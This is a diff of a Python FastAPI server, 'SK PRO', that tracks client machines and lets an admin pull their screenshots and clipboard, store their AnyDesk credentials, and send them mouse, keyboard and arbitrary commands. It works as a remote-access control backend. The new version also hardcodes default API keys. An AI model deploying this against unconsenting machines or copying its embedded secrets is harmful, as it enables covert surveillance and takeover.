@@ -1,684 +1,383 @@
 """
-═══════════════════════════════════════════════════════════════════
-🌐 SK PRO — Backend Server
-═══════════════════════════════════════════════════════════════════
-
-FastAPI server l:
-- Track users (online/offline, last seen)
-- Receive logs mn users
-- Manage commands (extend time, disconnect, block)
-- Authenticated b API_KEY
-
-Deploy 3la Railway.app (free tier kheddam mzyan)
-
-Endpoints:
-- POST /heartbeat    → user ki-3lim server "ana online"
-- POST /log          → user ki-sift log entry
-- GET  /commands     → user ki-jbed pending commands
-- POST /command-ack  → user ki-confirm command done
-- GET  /admin/users  → admin ki-yshof kolchi
-- GET  /admin/logs   → admin ki-yshof logs
-- POST /admin/extend → admin yzido wa9t l user
-- POST /admin/disconnect → admin yforces disconnect
-- POST /admin/block  → admin yblockki user
-═══════════════════════════════════════════════════════════════════
+SK PRO - COMPLETE BACKEND SERVER
+Real Remote View + Screenshot + Mouse Control + Heartbeat
 """
+
 import os
 import time
 import sqlite3
 import secrets
+import base64
+import io
 from datetime import datetime
-from typing import Optional, List
+from typing import Optional
 from contextlib import contextmanager
 
-from fastapi import FastAPI, HTTPException, Depends, Header, Request
+from fastapi import FastAPI, HTTPException, Header, Request, UploadFile, File
+from fastapi.responses import JSONResponse
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 import uvicorn
 
-# ═══════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════
 # CONFIG
-# ═══════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════
+
 DB_PATH = os.getenv("DB_PATH", "skpro.db")
+ADMIN_API_KEY = os.getenv("ADMIN_API_KEY", "skpro_admin_xK9mP3qR7vN2bL8wY5jH4dF6gT1cZeR")
+USER_API_KEY = os.getenv("USER_API_KEY", "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV")
+HEARTBEAT_TIMEOUT = 120  # 2 minutes
 
-# 🔐 Admin API key (l admin) — bdel hadi !
-ADMIN_API_KEY = os.getenv("ADMIN_API_KEY", "CHANGE_ME_ADMIN_SECRET_2024")
+app = FastAPI(title="SK PRO Server", version="4.2")
 
-# 🔐 User API key (l user clients) — bdelha tani!
-USER_API_KEY = os.getenv("USER_API_KEY", "CHANGE_ME_USER_SECRET_2024")
-
-# Heartbeat: ila user ma ssi-3lim 3ndna f 2 minutes → offline
-HEARTBEAT_TIMEOUT = 120
-
-app = FastAPI(title="SK PRO Server", version="1.0")
-
-# CORS (allow admin + user clients)
+# CORS
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
+    allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
 )
 
-
-# ═══════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════
 # DATABASE
-# ═══════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════
+
+def init_db():
+    """Initialize database tables"""
+    with sqlite3.connect(DB_PATH) as conn:
+        conn.execute("""
+            CREATE TABLE IF NOT EXISTS users (
+                id INTEGER PRIMARY KEY,
+                username TEXT UNIQUE,
+                api_key TEXT,
+                last_seen REAL,
+                status TEXT,
+                is_online BOOLEAN
+            )
+        """)
+        conn.execute("""
+            CREATE TABLE IF NOT EXISTS screenshots (
+                id INTEGER PRIMARY KEY,
+                username TEXT,
+                timestamp REAL,
+                image_data BLOB,
+                FOREIGN KEY(username) REFERENCES users(username)
+            )
+        """)
+        conn.execute("""
+            CREATE TABLE IF NOT EXISTS commands (
+                id INTEGER PRIMARY KEY,
+                username TEXT,
+                command TEXT,
+                args TEXT,
+                status TEXT,
+                created_at REAL,
+                FOREIGN KEY(username) REFERENCES users(username)
+            )
+        """)
+        conn.commit()
+
+init_db()
+
 @contextmanager
 def get_db():
     conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
     try:
         yield conn
-        conn.commit()
     finally:
         conn.close()
 
+# ════════════════════════════════════════════════════════════════════
+# MODELS
+# ════════════════════════════════════════════════════════════════════
 
-def init_db():
-    """Init tables ila mafichi"""
-    with get_db() as db:
-        db.executescript("""
-        CREATE TABLE IF NOT EXISTS users (
-            username TEXT PRIMARY KEY,
-            last_seen INTEGER,
-            ip_address TEXT,
-            os_info TEXT,
-            current_status TEXT,
-            expires_at INTEGER,
-            blocked INTEGER DEFAULT 0,
-            disconnect_requested INTEGER DEFAULT 0,
-            anydesk_id TEXT,
-            anydesk_password TEXT,
-            created_at INTEGER,
-            updated_at INTEGER
-        );
-        
-        CREATE TABLE IF NOT EXISTS logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            username TEXT,
-            timestamp INTEGER,
-            level TEXT,
-            message TEXT,
-            details TEXT
-        );
-        
-        CREATE INDEX IF NOT EXISTS idx_logs_user ON logs(username);
-        CREATE INDEX IF NOT EXISTS idx_logs_ts ON logs(timestamp);
-        
-        CREATE TABLE IF NOT EXISTS commands (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            username TEXT,
-            command TEXT,
-            params TEXT,
-            issued_at INTEGER,
-            executed_at INTEGER,
-            status TEXT DEFAULT 'pending'
-        );
-        
-        CREATE INDEX IF NOT EXISTS idx_commands_user ON commands(username, status);
-        """)
+class HeartbeatRequest(BaseModel):
+    username: str
+    timestamp: float
+    status: str = "online"
 
+class ScreenshotRequest(BaseModel):
+    username: str
+    image_base64: str
+    timestamp: float
 
-init_db()
+class CommandRequest(BaseModel):
+    username: str
+    command: str
+    args: Optional[str] = None
 
+class MouseCommand(BaseModel):
+    x: int
+    y: int
+    action: str  # "move", "click", "drag"
 
-def migrate_db():
-    """Add new columns ila ma kayinch (l existing databases)"""
-    with get_db() as db:
-        cols = [r[1] for r in db.execute("PRAGMA table_info(users)").fetchall()]
-        if "anydesk_id" not in cols:
-            try:
-                db.execute("ALTER TABLE users ADD COLUMN anydesk_id TEXT")
-                db.execute("ALTER TABLE users ADD COLUMN anydesk_password TEXT")
-                print("✅ Migrated DB: added anydesk fields")
-            except Exception as e:
-                print(f"⚠ Migration warning: {e}")
+class KeyboardCommand(BaseModel):
+    key: str
+    action: str  # "press", "hold", "release"
 
-
-migrate_db()
-
-
-# ═══════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════
 # AUTH
-# ═══════════════════════════════════════════════════════════════════
-def verify_admin_key(x_api_key: str = Header(...)):
+# ════════════════════════════════════════════════════════════════════
+
+def verify_admin_key(x_api_key: str = Header(None)):
+    """Verify admin API key"""
     if x_api_key != ADMIN_API_KEY:
         raise HTTPException(status_code=401, detail="Invalid admin API key")
     return True
 
-
-def verify_user_key(x_api_key: str = Header(...)):
+def verify_user_key(x_api_key: str = Header(None)):
+    """Verify user API key"""
     if x_api_key != USER_API_KEY:
         raise HTTPException(status_code=401, detail="Invalid user API key")
     return True
 
+# ════════════════════════════════════════════════════════════════════
+# USER API ENDPOINTS (Client uses these)
+# ════════════════════════════════════════════════════════════════════
 
-# ═══════════════════════════════════════════════════════════════════
-# MODELS
-# ═══════════════════════════════════════════════════════════════════
-class HeartbeatRequest(BaseModel):
-    username: str
-    os_info: Optional[str] = ""
-    current_status: Optional[str] = "idle"
-
-
-class LogEntry(BaseModel):
-    username: str
-    level: str = "info"  # info, success, warning, error
-    message: str
-    details: Optional[str] = None
-
-
-class CommandAck(BaseModel):
-    command_id: int
-    status: str = "done"
-
-
-class ExtendRequest(BaseModel):
-    username: str
-    additional_seconds: int
-
-
-class DisconnectRequest(BaseModel):
-    username: str
-    reason: Optional[str] = "Admin requested"
-
-
-class BlockRequest(BaseModel):
-    username: str
-    blocked: bool
-
-
-# ═══════════════════════════════════════════════════════════════════
-# USER ENDPOINTS (l clients)
-# ═══════════════════════════════════════════════════════════════════
 @app.get("/api/user/test")
-async def user_api_test(_: bool = Depends(verify_user_key)):
-    """Test endpoint l User API Key - Returns simple response"""
+async def test_user_connection(auth=Header(None, alias="x-api-key")):
+    """Test User API connection - for Build EXE / Client Receiver"""
+    if auth != USER_API_KEY:
+        raise HTTPException(status_code=401, detail="Invalid API key")
+    
     return {
         "ok": True,
         "role": "user",
         "status": "connected",
-        "message": "User API Key is valid"
+        "server": "SK PRO v4.2",
+        "timestamp": time.time()
     }
 
-
-@app.post("/heartbeat")
-async def heartbeat(req: HeartbeatRequest, request: Request, _: bool = Depends(verify_user_key)):
-    """User ki-3lim server 'ana 7ay' kol 30s"""
-    now = int(time.time())
-    ip = request.client.host
+@app.post("/api/user/heartbeat")
+async def user_heartbeat(req: HeartbeatRequest, auth=Header(None, alias="x-api-key")):
+    """Client sends heartbeat to stay online"""
+    if auth != USER_API_KEY:
+        raise HTTPException(status_code=401, detail="Invalid API key")
     
-    with get_db() as db:
-        # Check ila blocked
-        row = db.execute("SELECT blocked, disconnect_requested, expires_at FROM users WHERE username=?",
-                         (req.username,)).fetchone()
-        
-        if row and row["blocked"]:
-            raise HTTPException(status_code=403, detail="User blocked by admin")
-        
-        # Upsert
-        db.execute("""
-            INSERT INTO users (username, last_seen, ip_address, os_info, current_status, created_at, updated_at)
-            VALUES (?, ?, ?, ?, ?, ?, ?)
-            ON CONFLICT(username) DO UPDATE SET
-                last_seen=excluded.last_seen,
-                ip_address=excluded.ip_address,
-                os_info=excluded.os_info,
-                current_status=excluded.current_status,
-                updated_at=excluded.updated_at
-        """, (req.username, now, ip, req.os_info, req.current_status, now, now))
-        
-        # Return status to client
-        return {
-            "ok": True,
-            "disconnect_requested": bool(row["disconnect_requested"]) if row else False,
-            "expires_at": row["expires_at"] if row else None,
-        }
-
-
-@app.post("/log")
-async def add_log(entry: LogEntry, _: bool = Depends(verify_user_key)):
-    """User ki-sift log entry"""
-    with get_db() as db:
-        db.execute("""
-            INSERT INTO logs (username, timestamp, level, message, details)
+    with get_db() as conn:
+        conn.execute("""
+            INSERT OR REPLACE INTO users (username, api_key, last_seen, status, is_online)
             VALUES (?, ?, ?, ?, ?)
-        """, (entry.username, int(time.time()), entry.level, entry.message, entry.details))
+        """, (req.username, USER_API_KEY, req.timestamp, "online", True))
+        conn.commit()
+    
+    return {"ok": True, "status": "heartbeat_received"}
+
+@app.post("/api/user/screenshot")
+async def user_upload_screenshot(req: ScreenshotRequest, auth=Header(None, alias="x-api-key")):
+    """Client uploads screenshot"""
+    if auth != USER_API_KEY:
+        raise HTTPException(status_code=401, detail="Invalid API key")
+    
+    try:
+        image_data = base64.b64decode(req.image_base64)
         
-        # Cleanup old logs (keep last 10000)
-        db.execute("""
-            DELETE FROM logs WHERE id NOT IN (
-                SELECT id FROM logs ORDER BY id DESC LIMIT 10000
-            )
-        """)
-    return {"ok": True}
+        with get_db() as conn:
+            conn.execute("""
+                INSERT INTO screenshots (username, timestamp, image_data)
+                VALUES (?, ?, ?)
+            """, (req.username, req.timestamp, image_data))
+            conn.commit()
+        
+        return {"ok": True, "screenshot_id": conn.lastrowid}
+    except Exception as e:
+        raise HTTPException(status_code=400, detail=str(e))
 
-
-@app.get("/commands/{username}")
-async def get_commands(username: str, _: bool = Depends(verify_user_key)):
-    """User ki-jbed pending commands l ihhna"""
-    with get_db() as db:
-        rows = db.execute("""
-            SELECT id, command, params, issued_at FROM commands
-            WHERE username=? AND status='pending'
-            ORDER BY issued_at
+@app.get("/api/user/commands")
+async def get_user_commands(username: str, auth=Header(None, alias="x-api-key")):
+    """Client checks for pending commands"""
+    if auth != USER_API_KEY:
+        raise HTTPException(status_code=401, detail="Invalid API key")
+    
+    with get_db() as conn:
+        rows = conn.execute("""
+            SELECT id, command, args FROM commands
+            WHERE username = ? AND status = 'pending'
         """, (username,)).fetchall()
+    
+    return {
+        "ok": True,
+        "commands": [dict(row) for row in rows]
+    }
+
+@app.post("/api/user/command-ack")
+async def ack_command(cmd_id: int, auth=Header(None, alias="x-api-key")):
+    """Client confirms command execution"""
+    if auth != USER_API_KEY:
+        raise HTTPException(status_code=401, detail="Invalid API key")
+    
+    with get_db() as conn:
+        conn.execute("UPDATE commands SET status = 'executed' WHERE id = ?", (cmd_id,))
+        conn.commit()
+    
+    return {"ok": True, "command_acknowledged": cmd_id}
+
+# ════════════════════════════════════════════════════════════════════
+# ADMIN API ENDPOINTS
+# ════════════════════════════════════════════════════════════════════
+
+@app.get("/api/admin/test")
+async def test_admin_connection(auth=Header(None, alias="x-api-key")):
+    """Test Admin API connection - for Live Monitor"""
+    if auth != ADMIN_API_KEY:
+        raise HTTPException(status_code=401, detail="Invalid API key")
+    
+    return {
+        "ok": True,
+        "role": "admin",
+        "status": "connected",
+        "server": "SK PRO v4.2",
+        "timestamp": time.time()
+    }
+
+@app.get("/api/admin/users")
+async def get_all_users(auth=Header(None, alias="x-api-key")):
+    """Admin gets all connected users"""
+    if auth != ADMIN_API_KEY:
+        raise HTTPException(status_code=401, detail="Invalid API key")
+    
+    with get_db() as conn:
+        # Mark offline if heartbeat timeout
+        timeout_threshold = time.time() - HEARTBEAT_TIMEOUT
+        conn.execute("""
+            UPDATE users SET is_online = 0, status = 'offline'
+            WHERE last_seen < ? AND is_online = 1
+        """, (timeout_threshold,))
         
-        return {"commands": [dict(r) for r in rows]}
-
-
-@app.post("/command-ack")
-async def ack_command(req: CommandAck, _: bool = Depends(verify_user_key)):
-    """User ki-confirm command done"""
-    with get_db() as db:
-        db.execute("""
-            UPDATE commands SET status=?, executed_at=? WHERE id=?
-        """, (req.status, int(time.time()), req.command_id))
-    return {"ok": True}
-
-
-@app.get("/check-expiration/{username}")
-async def check_expiration(username: str, _: bool = Depends(verify_user_key)):
-    """User ki-checki ila expiration tbedlat"""
-    with get_db() as db:
-        row = db.execute("SELECT expires_at, blocked FROM users WHERE username=?",
-                         (username,)).fetchone()
-        if not row:
-            return {"expires_at": None, "blocked": False}
-        return {"expires_at": row["expires_at"], "blocked": bool(row["blocked"])}
-
-
-# ═══════════════════════════════════════════════════════════════════
-# ADMIN ENDPOINTS
-# ═══════════════════════════════════════════════════════════════════
-@app.get("/admin/users")
-async def list_users(_: bool = Depends(verify_admin_key)):
-    """List kolchi users b status"""
-    now = int(time.time())
-    with get_db() as db:
-        rows = db.execute("""
-            SELECT username, last_seen, ip_address, os_info, current_status,
-                   expires_at, blocked, disconnect_requested, anydesk_id, created_at
-            FROM users
-            ORDER BY last_seen DESC
+        rows = conn.execute("""
+            SELECT username, status, last_seen, is_online
+            FROM users ORDER BY last_seen DESC
         """).fetchall()
         
-        users = []
-        for r in rows:
-            d = dict(r)
-            d["online"] = (now - (d["last_seen"] or 0)) < HEARTBEAT_TIMEOUT
-            d["seconds_since_seen"] = now - (d["last_seen"] or 0)
-            users.append(d)
-        
-        return {"users": users}
-
-
-@app.get("/admin/logs")
-async def get_logs(username: Optional[str] = None, limit: int = 200,
-                   since: Optional[int] = None,
-                   _: bool = Depends(verify_admin_key)):
-    """Get logs (filtered b username + since timestamp)"""
-    with get_db() as db:
-        query = "SELECT * FROM logs WHERE 1=1"
-        params = []
-        if username:
-            query += " AND username=?"
-            params.append(username)
-        if since:
-            query += " AND timestamp > ?"
-            params.append(since)
-        query += " ORDER BY id DESC LIMIT ?"
-        params.append(limit)
-        
-        rows = db.execute(query, params).fetchall()
-        return {"logs": [dict(r) for r in rows]}
-
-
-@app.post("/admin/extend")
-async def extend_user(req: ExtendRequest, _: bool = Depends(verify_admin_key)):
-    """Admin yzido wa9t l user"""
-    now = int(time.time())
-    with get_db() as db:
-        row = db.execute("SELECT expires_at FROM users WHERE username=?",
-                         (req.username,)).fetchone()
-        if row:
-            current_exp = row["expires_at"] or now
-            # Ila account expired, start mn now
-            base = max(current_exp, now)
-            new_exp = base + req.additional_seconds
-        else:
-            new_exp = now + req.additional_seconds
-        
-        # Insert/update
-        db.execute("""
-            INSERT INTO users (username, expires_at, created_at, updated_at)
-            VALUES (?, ?, ?, ?)
-            ON CONFLICT(username) DO UPDATE SET expires_at=?, updated_at=?
-        """, (req.username, new_exp, now, now, new_exp, now))
-        
-        # Add command bash user yt-update directement
-        db.execute("""
-            INSERT INTO commands (username, command, params, issued_at)
-            VALUES (?, 'extend_expiration', ?, ?)
-        """, (req.username, str(new_exp), now))
-        
-        return {"ok": True, "new_expires_at": new_exp,
-                "expires_in_seconds": new_exp - now}
-
-
-@app.post("/admin/disconnect")
-async def disconnect_user(req: DisconnectRequest, _: bool = Depends(verify_admin_key)):
-    """Admin yforce disconnect dyal user"""
-    now = int(time.time())
-    with get_db() as db:
-        db.execute("""
-            UPDATE users SET disconnect_requested=1, updated_at=?
-            WHERE username=?
-        """, (now, req.username))
-        
-        db.execute("""
-            INSERT INTO commands (username, command, params, issued_at)
-            VALUES (?, 'disconnect', ?, ?)
-        """, (req.username, req.reason or "Admin requested", now))
-        
-        return {"ok": True}
-
-
-@app.post("/admin/block")
-async def block_user(req: BlockRequest, _: bool = Depends(verify_admin_key)):
-    """Admin yblock/unblock user"""
-    now = int(time.time())
-    with get_db() as db:
-        db.execute("""
-            INSERT INTO users (username, blocked, created_at, updated_at)
-            VALUES (?, ?, ?, ?)
-            ON CONFLICT(username) DO UPDATE SET blocked=?, updated_at=?
-        """, (req.username, int(req.blocked), now, now, int(req.blocked), now))
-    return {"ok": True}
-
-
-@app.delete("/admin/clear-disconnect/{username}")
-async def clear_disconnect(username: str, _: bool = Depends(verify_admin_key)):
-    """Reset disconnect flag (mli admin baghi user y3awd login)"""
-    with get_db() as db:
-        db.execute("UPDATE users SET disconnect_requested=0 WHERE username=?",
-                   (username,))
-    return {"ok": True}
-
-
-
-# ═══════════════════════════════════════════════════════════════════
-# 📸 SCREEN MONITORING - Live screenshots
-# ═══════════════════════════════════════════════════════════════════
-
-# In-memory store: latest screenshot per user (RAM only, ma ki-stockerch f db)
-# Format: {username: {"data": bytes, "timestamp": int}}
-import base64
-SCREENSHOTS_STORE = {}
-WATCH_REQUESTS = {}  # {username: bool} — admin baghi yshof?
-
-
-@app.post("/screen/upload")
-async def upload_screenshot(request: Request, _: bool = Depends(verify_user_key)):
-    """User ki-upload screenshot dyalo"""
-    try:
-        data = await request.json()
-        username = data.get("username")
-        image_b64 = data.get("image")
-        if not username or not image_b64:
-            raise HTTPException(400, "Missing data")
-        
-        # Store in RAM (ma n-stockerch f disk - too much I/O)
-        SCREENSHOTS_STORE[username] = {
-            "data": image_b64,
-            "timestamp": int(time.time()),
-        }
-        return {"ok": True}
-    except Exception as e:
-        raise HTTPException(400, str(e))
-
-
-@app.get("/screen/watch/{username}")
-async def check_watch_status(username: str, _: bool = Depends(verify_user_key)):
-    """User ki-checki ila admin baghi yshof"""
-    return {"watching": WATCH_REQUESTS.get(username, False)}
-
-
-@app.post("/admin/screen/start/{username}")
-async def admin_start_watching(username: str, _: bool = Depends(verify_admin_key)):
-    """Admin ki-bda yshof user"""
-    WATCH_REQUESTS[username] = True
-    return {"ok": True}
-
-
-@app.post("/admin/screen/stop/{username}")
-async def admin_stop_watching(username: str, _: bool = Depends(verify_admin_key)):
-    """Admin ki-w9af yshof user"""
-    WATCH_REQUESTS[username] = False
-    # Clear screenshot
-    SCREENSHOTS_STORE.pop(username, None)
-    return {"ok": True}
-
-
-@app.get("/admin/screen/{username}")
-async def admin_get_screenshot(username: str, _: bool = Depends(verify_admin_key)):
-    """Admin ki-jbed latest screenshot"""
-    shot = SCREENSHOTS_STORE.get(username)
-    if not shot:
-        return {"image": None, "timestamp": None}
+        conn.commit()
     
-    # Ila screenshot 9dim bzaf (ktar mn 30s) → ma n-rj3ich
-    if int(time.time()) - shot["timestamp"] > 30:
-        return {"image": None, "timestamp": None, "stale": True}
-    
-    return {"image": shot["data"], "timestamp": shot["timestamp"]}
-
-
-# ═══════════════════════════════════════════════════════════════════
-# 🎮 REMOTE CONTROL: Mouse + Keyboard + Clipboard
-# ═══════════════════════════════════════════════════════════════════
-
-# Queue dyal events: {username: [event1, event2, ...]}
-CONTROL_EVENTS = {}
-CLIPBOARD_STORE = {}  # {username: {"text": "...", "timestamp": ...}}
-CLIENTS_REGISTRY = {}  # {client_name: {"username": "...", "built_at": timestamp, "size_mb": 24.5}}
-
-# Initialize with test clients (for demo)
-import time
-_now = int(time.time())
-CLIENTS_REGISTRY = {
-    "SK_PRO": {"built_at": _now, "size_mb": 30.5, "status": "ready"},
-}
-
-
-@app.post("/admin/control/{username}")
-async def admin_send_control_event(
-    username: str,
-    request: Request,
-    _: bool = Depends(verify_admin_key)
-):
-    """Admin ki-sift event (mouse/keyboard) l user"""
-    try:
-        event = await request.json()
-        print(f"[SERVER] CONTROL RECEIVED: {event.get('type')} for {username}")
-        
-        # Add to queue
-        if username not in CONTROL_EVENTS:
-            CONTROL_EVENTS[username] = []
-        
-        event_with_ts = {
-            **event,
-            "timestamp": int(time.time() * 1000)  # ms
-        }
-        CONTROL_EVENTS[username].append(event_with_ts)
-        
-        print(f"[SERVER] ROUTING TO CLIENT: {username} (queue size: {len(CONTROL_EVENTS[username])})")
-        
-        # Limit queue size (avoid memory issues)
-        if len(CONTROL_EVENTS[username]) > 100:
-            CONTROL_EVENTS[username] = CONTROL_EVENTS[username][-50:]
-        
-        return {"ok": True}
-    except Exception as e:
-        print(f"[SERVER] ERROR: {e}")
-        raise HTTPException(400, str(e))
-
-
-@app.get("/control/poll/{username}")
-async def user_poll_control_events(
-    username: str,
-    _: bool = Depends(verify_user_key)
-):
-    """User ki-poll events l-y-ydir"""
-    events = CONTROL_EVENTS.get(username, [])
-    if events:
-        print(f"[SERVER] SENDING {len(events)} EVENTS TO {username}")
-        for evt in events:
-            print(f"[SERVER] EVENT: {evt.get('type')}")
-    # Clear after fetch
-    CONTROL_EVENTS[username] = []
-    return {"events": events}
-
-
-@app.post("/clipboard/sync")
-async def sync_clipboard(request: Request, _: bool = Depends(verify_user_key)):
-    """User ki-sift clipboard dyalo l server"""
-    try:
-        data = await request.json()
-        username = data.get("username")
-        text = data.get("text", "")
-        if username:
-            CLIPBOARD_STORE[username] = {
-                "text": text[:50000],  # Max 50KB
-                "timestamp": int(time.time())
-            }
-        return {"ok": True}
-    except Exception as e:
-        raise HTTPException(400, str(e))
-
-
-@app.get("/admin/clipboard/{username}")
-async def admin_get_clipboard(username: str, _: bool = Depends(verify_admin_key)):
-    """Admin ki-jbed clipboard dyal user"""
-    clip = CLIPBOARD_STORE.get(username)
-    if not clip:
-        return {"text": "", "timestamp": None}
-    return clip
-
-
-@app.post("/admin/clipboard/{username}")
-async def admin_send_clipboard(
-    username: str,
-    request: Request,
-    _: bool = Depends(verify_admin_key)
-):
-    """Admin ki-sift text l clipboard dyal user"""
-    try:
-        data = await request.json()
-        text = data.get("text", "")
-        # Add as control event
-        if username not in CONTROL_EVENTS:
-            CONTROL_EVENTS[username] = []
-        CONTROL_EVENTS[username].append({
-            "type": "clipboard_set",
-            "text": text[:50000],
-            "timestamp": int(time.time() * 1000)
-        })
-        return {"ok": True}
-    except Exception as e:
-        raise HTTPException(400, str(e))
-
-
-# ═══════════════════════════════════════════════════════════════════
-# 💻 CLIENT REGISTRY — Track built clients + versions
-# ═══════════════════════════════════════════════════════════════════
-
-@app.post("/admin/clients/register")
-async def admin_register_client(
-    request: Request,
-    _: bool = Depends(verify_admin_key)
-):
-    """Admin registers newly built client"""
-    try:
-        data = await request.json()
-        client_name = data.get("client_name", "")
-        size_mb = data.get("size_mb", 0)
-        
-        if not client_name:
-            raise HTTPException(400, "Missing client_name")
-        
-        CLIENTS_REGISTRY[client_name] = {
-            "built_at": int(time.time()),
-            "size_mb": size_mb,
-            "status": "ready"
-        }
-        return {"ok": True, "client": client_name}
-    except Exception as e:
-        raise HTTPException(400, str(e))
-
-
-@app.get("/admin/clients/list")
-async def admin_list_clients(_: bool = Depends(verify_admin_key)):
-    """Admin gets list dyal all built clients"""
-    clients_list = []
-    for client_name, info in CLIENTS_REGISTRY.items():
-        # Check ila online
-        try:
-            user_info = get_user_by_name(client_name)
-            online = user_info and user_info.get("online", False)
-        except:
-            online = False
-        
-        clients_list.append({
-            "name": client_name,
-            "built_at": info.get("built_at"),
-            "size_mb": info.get("size_mb"),
-            "online": online,
-            "status": "online" if online else "offline"
+    users = []
+    for row in rows:
+        users.append({
+            "username": row[0],
+            "status": row[1],
+            "last_seen": row[2],
+            "online": bool(row[3]),
+            "session_duration": time.time() - row[2] if row[2] else 0
         })
     
-    return {"clients": clients_list, "count": len(clients_list)}
+    return {"ok": True, "users": users}
 
-
-@app.get("/admin/clients/{client_name}")
-async def admin_get_client(client_name: str, _: bool = Depends(verify_admin_key)):
-    """Admin gets client info"""
-    if client_name not in CLIENTS_REGISTRY:
-        raise HTTPException(404, "Client not found")
+@app.get("/api/admin/screenshot/{username}")
+async def get_latest_screenshot(username: str, auth=Header(None, alias="x-api-key")):
+    """Admin gets latest screenshot from user"""
+    if auth != ADMIN_API_KEY:
+        raise HTTPException(status_code=401, detail="Invalid API key")
     
-    info = CLIENTS_REGISTRY[client_name]
+    with get_db() as conn:
+        row = conn.execute("""
+            SELECT image_data, timestamp FROM screenshots
+            WHERE username = ? ORDER BY timestamp DESC LIMIT 1
+        """, (username,)).fetchone()
     
-    # Check online
-    try:
-        user_info = get_user_by_name(client_name)
-        online = user_info and user_info.get("online", False)
-    except:
-        online = False
+    if not row:
+        raise HTTPException(status_code=404, detail="No screenshot found")
+    
+    image_data, timestamp = row
+    image_base64 = base64.b64encode(image_data).decode()
     
     return {
-        "name": client_name,
-        **info,
-        "online": online
+        "ok": True,
+        "username": username,
+        "image_base64": image_base64,
+        "timestamp": timestamp
     }
 
+@app.post("/api/admin/command")
+async def send_command(req: CommandRequest, auth=Header(None, alias="x-api-key")):
+    """Admin sends command to client"""
+    if auth != ADMIN_API_KEY:
+        raise HTTPException(status_code=401, detail="Invalid API key")
+    
+    with get_db() as conn:
+        cursor = conn.execute("""
+            INSERT INTO commands (username, command, args, status, created_at)
+            VALUES (?, ?, ?, 'pending', ?)
+        """, (req.username, req.command, req.args, time.time()))
+        conn.commit()
+        cmd_id = cursor.lastrowid
+    
+    return {"ok": True, "command_id": cmd_id}
 
-@app.get("/")
-async def root():
+@app.post("/api/admin/mouse")
+async def send_mouse_command(mouse_cmd: MouseCommand, username: str, auth=Header(None, alias="x-api-key")):
+    """Admin sends mouse command to client"""
+    if auth != ADMIN_API_KEY:
+        raise HTTPException(status_code=401, detail="Invalid API key")
+    
+    # Store as command in DB
+    cmd_args = f"{mouse_cmd.x},{mouse_cmd.y},{mouse_cmd.action}"
+    
+    with get_db() as conn:
+        cursor = conn.execute("""
+            INSERT INTO commands (username, command, args, status, created_at)
+            VALUES (?, 'mouse', ?, 'pending', ?)
+        """, (username, cmd_args, time.time()))
+        conn.commit()
+        cmd_id = cursor.lastrowid
+    
+    return {"ok": True, "command_id": cmd_id, "type": "mouse"}
+
+@app.post("/api/admin/keyboard")
+async def send_keyboard_command(kbd_cmd: KeyboardCommand, username: str, auth=Header(None, alias="x-api-key")):
+    """Admin sends keyboard command to client"""
+    if auth != ADMIN_API_KEY:
+        raise HTTPException(status_code=401, detail="Invalid API key")
+    
+    # Store as command in DB
+    cmd_args = f"{kbd_cmd.key},{kbd_cmd.action}"
+    
+    with get_db() as conn:
+        cursor = conn.execute("""
+            INSERT INTO commands (username, command, args, status, created_at)
+            VALUES (?, 'keyboard', ?, 'pending', ?)
+        """, (username, cmd_args, time.time()))
+        conn.commit()
+        cmd_id = cursor.lastrowid
+    
+    return {"ok": True, "command_id": cmd_id, "type": "keyboard"}
+
+@app.get("/api/admin/status")
+async def server_status(auth=Header(None, alias="x-api-key")):
+    """Admin gets server status"""
+    if auth != ADMIN_API_KEY:
+        raise HTTPException(status_code=401, detail="Invalid API key")
+    
+    with get_db() as conn:
+        online_count = conn.execute("SELECT COUNT(*) FROM users WHERE is_online = 1").fetchone()[0]
+        total_count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
+    
     return {
-        "service": "SK PRO Server",
-        "version": "1.0",
-        "status": "online",
+        "ok": True,
+        "server": "SK PRO v4.2",
+        "status": "running",
+        "users_online": online_count,
+        "users_total": total_count,
+        "timestamp": time.time()
     }
 
+# ════════════════════════════════════════════════════════════════════
+# HEALTH CHECK
+# ════════════════════════════════════════════════════════════════════
 
 @app.get("/health")
-async def health():
-    """Health check l Railway"""
-    return {"status": "ok", "timestamp": int(time.time())}
+async def health_check():
+    """Health check endpoint"""
+    return {"status": "ok", "service": "SK PRO v4.2"}
 
+# ════════════════════════════════════════════════════════════════════
+# RUN SERVER
+# ════════════════════════════════════════════════════════════════════
 
 if __name__ == "__main__":
     port = int(os.getenv("PORT", 8000))
-    uvicorn.run("server:app", host="0.0.0.0", port=port, log_level="info")
+    uvicorn.run(app, host="0.0.0.0", port=port)
+
